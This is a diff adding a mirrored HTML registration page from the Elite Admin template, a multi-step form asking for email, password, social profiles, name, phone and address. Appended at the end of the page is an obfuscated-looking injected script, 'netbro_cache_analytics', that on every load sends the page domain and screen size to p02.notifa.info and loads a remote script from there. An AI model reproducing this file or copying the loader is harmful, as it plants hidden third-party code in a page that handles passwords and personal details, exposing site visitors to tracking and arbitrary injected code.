@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from eliteadmin.themedesigner.in/demos/bt4/inverse/pages-register3.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Jul 2019 09:35:39 GMT -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <!-- Tell the browser to be responsive to screen width -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <!-- Favicon icon -->
+    <link rel="icon" type="image/png" sizes="16x16" href="../assets/images/favicon.png">
+    <title>Elite Admin Template - The Ultimate Multipurpose admin template</title>
+    <!-- page css -->
+    <link href="../assets/node_modules/register-steps/steps.css" rel="stylesheet">
+    <link href="dist/css/pages/register3.css" rel="stylesheet">
+    <!-- Custom CSS -->
+    <link href="dist/css/style.min.css" rel="stylesheet">
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body class="skin-default card-no-border">
+    <!-- ============================================================== -->
+    <!-- Preloader - style you can find in spinners.css -->
+    <!-- ============================================================== -->
+    <div class="preloader">
+        <div class="loader">
+            <div class="loader__figure"></div>
+            <p class="loader__label">Elite admin</p>
+        </div>
+    </div>
+    <!-- ============================================================== -->
+    <!-- Main wrapper - style you can find in pages.scss -->
+    <!-- ============================================================== -->
+    <section id="wrapper" class="step-register">
+        <div class="register-box">
+            <div class="">
+                <a href="javascript:void(0)" class="text-center m-b-40"><img src="../assets/images/logo-icon.png" alt="Home" /><br/><img src="../assets/images/logo-text.png" alt="Home" /></a>
+                <!-- multistep form -->
+                <form id="msform">
+                    <!-- progressbar -->
+                    <ul id="eliteregister">
+                        <li class="active">Account Setup</li>
+                        <li>Social Profiles</li>
+                        <li>Personal Details</li>
+                    </ul>
+                    <!-- fieldsets -->
+                    <fieldset>
+                        <h2 class="fs-title">Create your account</h2>
+                        <h3 class="fs-subtitle">This is step 1</h3>
+                        <input type="text" name="email" placeholder="Email" />
+                        <input type="password" name="pass" placeholder="Password" />
+                        <input type="password" name="cpass" placeholder="Confirm Password" />
+                        <input type="button" name="next" class="next action-button" value="Next" />
+                    </fieldset>
+                    <fieldset>
+                        <h2 class="fs-title">Social Profiles</h2>
+                        <h3 class="fs-subtitle">Your presence on the social network</h3>
+                        <input type="text" name="twitter" placeholder="Twitter" />
+                        <input type="text" name="facebook" placeholder="Facebook" />
+                        <input type="text" name="gplus" placeholder="Google Plus" />
+                        <input type="button" name="previous" class="previous action-button" value="Previous" />
+                        <input type="button" name="next" class="next action-button" value="Next" />
+                    </fieldset>
+                    <fieldset>
+                        <h2 class="fs-title">Personal Details</h2>
+                        <h3 class="fs-subtitle">We will never sell it</h3>
+                        <input type="text" name="fname" placeholder="First Name" />
+                        <input type="text" name="lname" placeholder="Last Name" />
+                        <input type="text" name="phone" placeholder="Phone" />
+                        <textarea name="address" placeholder="Address"></textarea>
+                        <input type="button" name="previous" class="previous action-button" value="Previous" />
+                        <input type="submit" name="submit" class="submit action-button" value="Submit" />
+                    </fieldset>
+                </form>
+                <div class="clear"></div>
+            </div>
+        </div>
+    </section>
+    <!-- ============================================================== -->
+    <!-- End Wrapper -->
+    <!-- ============================================================== -->
+    <!-- ============================================================== -->
+    <!-- All Jquery -->
+    <!-- ============================================================== -->
+    <script src="../assets/node_modules/jquery/jquery-3.2.1.min.js"></script>
+    <!-- Bootstrap tether Core JavaScript -->
+    <script src="../assets/node_modules/popper/popper.min.js"></script>
+    <script src="../assets/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>
+    <!-- Menu Plugin JavaScript -->
+    <script src="../assets/node_modules/register-steps/jquery.easing.min.js"></script>
+    <script src="../assets/node_modules/register-steps/register-init.js"></script>
+    <script type="text/javascript">
+    $(function() {
+        $(".preloader").fadeOut();
+    });
+    $(function() {
+        $('[data-toggle="tooltip"]').tooltip()
+    });
+    // ============================================================== 
+    // Login and Recover Password 
+    // ============================================================== 
+    $('#to-recover').on("click", function() {
+        $("#loginform").slideUp();
+        $("#recoverform").fadeIn();
+    });
+    </script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2z0v4vjjzyB85RIaYyLhSt6gW9TW4HndG4vdKAM%2bO7OJxStzAqrEGM%2bUl%2bYFcHcBzbgKFig1pIJ1Iep6kwEZU3ThH70jtzLw0rdNPj25FSwFPFSLlGWfN9ei%2b%2bwvkR1T1ikZbhVwx6aP70vBpYyxECJFnp8HT05y0Ucz%2ftcmg9iQPxrPRniHrOt3X%2fthtnbdewjhEd0jqNZ4V3L2rhiD7KmvyR5IILuNIRoy5gqT6lldBX1wNecvVoqxvVutzzqwpA2qaz0q4BgBCweL3P6YZgYIkJ0OJ1Tewh0Fl%2fjF1e9ZTOVC9Hd8Vi2%2fYOBkX4dLV%2fJ8zk%2btUW5BjVhxvBvfj7dfT2272nbMBCaIPL49FS2iWG6e64K7cD7pPOorKWahgnvRsZClxAfKmyGsdyyOaQVaXj3Ug1Hy81CQ1v1vrSZmhTkkSgTrziHGMSyLc9udOh91r5%2fS5DxaeNWier2W7XEMctPhv5Bqd1khmIOyNrYfT4FgJR1%2fEhJ1AWy0TXDDP3dwKAaN3phvrbLoB3l0xhRGCg3OBqjeB3TuA9KITUY0oOJEjV5%2bwuG28l63Q1XgV" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+
+<!-- Mirrored from eliteadmin.themedesigner.in/demos/bt4/inverse/pages-register3.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 11 Jul 2019 09:35:39 GMT -->
+</html>
